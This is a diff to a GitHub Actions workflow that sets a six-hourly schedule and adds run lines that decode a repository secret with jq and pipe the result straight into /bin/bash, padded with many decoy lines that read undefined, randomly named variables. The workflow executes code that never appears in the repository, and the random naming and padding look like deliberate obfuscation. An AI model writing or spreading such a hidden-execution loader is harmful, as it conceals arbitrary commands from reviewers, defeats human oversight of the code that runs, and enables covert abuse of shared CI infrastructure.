@@ -1,22 +1,30 @@
 name: wanyiedud
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 5/6 * * *'
-
-jobs:  # 23330
+    - cron: '6 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wanyiedud
         env:
-          prv76636: ${{ secrets.prv76636 }}
+          kb2: ${{ secrets.kb2 }}
         run: |
-          echo $prv76636 | jq -r .qrl3101 | /bin/bash
-          echo $dg68145 | jq -r .inn1742 | /bin/bash
-          echo $afuh20 | jq -r .v37675 | /bin/bash
-          echo $o6 | jq -r .b05457 | /bin/bash
-          echo $m737 | jq -r .xjeq00724 | /bin/bash
+          echo $kb2 | jq -r .kposp4 | /bin/bash
+          echo $hup12712 | jq -r .k75103 | /bin/bash
+          echo $s7221 | jq -r .peiim49488 | /bin/bash
+          echo $qotwz92863 | jq -r .tr673 | /bin/bash
+          echo $s96135 | jq -r .qws0 | /bin/bash
+          echo $f9 | jq -r .fpcka495 | /bin/bash
+          echo $y64584 | jq -r .dpq779 | /bin/bash
+          echo $kedg3 | jq -r .pd43 | /bin/bash
+          echo $uk6788 | jq -r .d5758 | /bin/bash
+          echo $agn1 | jq -r .zf812 | /bin/bash
+          echo $rla42526 | jq -r .wgms520 | /bin/bash
+          echo $i200 | jq -r .r15 | /bin/bash
+          echo $smpw54 | jq -r .q4 | /bin/bash
+          echo $dcfdd68 | jq -r .klzbf24 | /bin/bash
 
